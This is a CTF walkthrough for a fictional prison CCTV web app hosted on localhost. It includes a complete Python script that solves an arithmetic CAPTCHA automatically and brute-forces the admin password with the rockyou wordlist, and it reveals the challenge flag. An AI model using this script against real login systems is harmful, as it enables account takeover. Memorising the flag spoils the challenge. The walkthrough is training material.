# Control Room Challenge 1 walkthrough

*App:** ROCKGATE Correctional CCTV Management System  
**Stack:** PHP + MySQL  
**Target:** `http://localhost:8080`  
**Admin Email:** `ray.breslin@escapeplan.ctf`

---

## Challenge Overview

| Part | Challenge | Flag |
|------|-----------|------|
| 2a | Brute-force admin login | `PrisonCTF{brut3_f0rc3_1s_th3_w4y}` |
| 2a | OSINT — find admin email | — |

---

## Step 1 — Reconnaissance

### Check robots.txt

```bash
curl http://localhost:8080/robots.txt
```

Response:

```
User-agent: *
Disallow: /dashboard.php
Disallow: /r3g111ster.php
Disallow: /upload.php
Disallow: /uploads/
```

Key findings:
- `/r3g111ster.php` — registration portal (obfuscated name)
- `/upload.php` — file upload endpoint (admin only)
- `/uploads/` — uploaded files are web-accessible

---

## Step 2 — Register a Normal User

Visit `/r3g111ster.php` or use curl:

```bash
curl -s -X POST http://localhost:8080/r3g111ster.php \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test1234"}'
```

Response:
```json
{"success":true,"message":"OPERATOR ENROLLED — REDIRECTING TO LOGIN"}
```

This creates a `role = 'user'` account. Not enough — we need admin.  
**Goal:** Brute-force the `officers` table which stores plaintext passwords.

---

## Step 3 — Understand the CAPTCHA

Every login attempt requires a fresh CAPTCHA token.

```bash
curl -s http://localhost:8080/captcha.php
```

Response:
```json
{"token":"a3f9bc...","question":"14 * 7"}
```

- Math operations: `+`, `-`, `*` with operands 1–20
- Token is **one-time use** and **session-bound** — stored in `$_SESSION`
- Expires in 300 seconds
- **Cannot be skipped** — validated server-side in `login.php`

The trick: fetch a new captcha, solve the math, submit both token + answer with every login attempt.

---

## Step 4 — Brute-Force Admin Login

### Vulnerability

`login.php` checks the `officers` table using **plaintext password comparison**:

```php
$stmt = $pdo->prepare("SELECT * FROM officers WHERE email = ? AND password = ?");
$stmt->execute([$email, $password]);
```

No hashing → directly brute-forceable with rockyou.

> **Clue on login page:** `ROCKYOU IS THE WAY`

### Brute-Force Script

Save as `bruteforce.py` and run it:

```python
#!/usr/bin/env python3
"""
Irongate CTF — Brute-force script
Solves CAPTCHA automatically on every attempt.
"""

import requests
import re
import sys
import operator

TARGET   = "http://localhost:8080"
EMAIL    = "ray.breslin@escapeplan.ctf"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

OPS = {
    '+': operator.add,
    '-': operator.sub,
    '*': operator.mul,
}

def solve_captcha(question):
    match = re.match(r'(\d+)\s*([+\-*])\s*(\d+)', question)
    if not match:
        raise ValueError(f"Unrecognised captcha format: {question}")
    a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
    return OPS[op](a, b)

def get_captcha(session):
    r = session.get(f"{TARGET}/captcha.php", timeout=10)
    r.raise_for_status()
    data = r.json()
    token  = data["token"]
    answer = solve_captcha(data["question"])
    return token, answer

def try_login(session, password):
    token, answer = get_captcha(session)
    resp = session.post(
        f"{TARGET}/login.php",
        json={
            "email":          EMAIL,
            "password":       password,
            "captcha_token":  token,
            "captcha_answer": str(answer),
        },
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    result = resp.json()
    return result.get("success", False), result.get("message", "")

print(f"[*] Target  : {TARGET}")
print(f"[*] Email   : {EMAIL}")
print(f"[*] Wordlist: {WORDLIST}")
print("-" * 50)

session = requests.Session()
tried   = 0
found   = False

try:
    with open(WORDLIST, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue

            tried += 1
            try:
                success, message = try_login(session, password)
            except Exception as e:
                print(f"[!] Error on attempt {tried}: {e}")
                continue

            if success:
                print(f"\n[+] PASSWORD FOUND after {tried} attempts!")
                print(f"[+] Email   : {EMAIL}")
                print(f"[+] Password: {password}")
                found = True
                break
            else:
                print(f"[-] {tried:>6} | {password:<30} | {message}")

except FileNotFoundError:
    print(f"[!] Wordlist not found: {WORDLIST}")
    sys.exit(1)

if not found:
    print(f"\n[-] Password not found after {tried} attempts.")
```

### Run it

```bash
python3 bruteforce.py
```

### Expected output

```
[*] Target  : http://localhost:8080
[*] Email   : ray.breslin@escapeplan.ctf
[*] Wordlist: /usr/share/wordlists/rockyou.txt
--------------------------------------------------
[-]      1 | 123456                         | AUTHENTICATION FAILED...
[-]      2 | password                       | AUTHENTICATION FAILED...
...
[+] PASSWORD FOUND after X attempts!
[+] Email   : ray.breslin@escapeplan.ctf
[+] Password: <password>
```

Login and click **SHUTDOWN ALL FEEDS** on the dashboard to reveal:

**FLAG 2a:** `PrisonCTF{brut3_f0rc3_1s_th3_w4y}`

---

## Step 5 — Admin Dashboard

After login, `/dashboard.php` shows:

- Live CCTV feeds (admin only)
- **SHUTDOWN ALL FEEDS** → reveals FLAG 2a
- **Operator Broadcast Terminal** → XSS challenge (Part 2b)
- **Firmware Package Uploader** → locked, requires an unlock key (Part 2b)

---

## Attack Summary

```
1. curl http://localhost:8080/robots.txt
   → finds /r3g111ster.php, /upload.php, /uploads/

2. POST /r3g111ster.php {"email":"x@x.com","password":"test1234"}
   → register to confirm login works

3. python3 bruteforce.py
   → solves CAPTCHA each attempt (GET /captcha.php → eval math)
   → brute-forces officers table (plaintext passwords)
   → creds: ray.breslin@escapeplan.ctf : <password>
   → FLAG 2a: PrisonCTF{brut3_f0rc3_1s_th3_w4y}  (toggle SHUTDOWN ALL FEEDS)
```
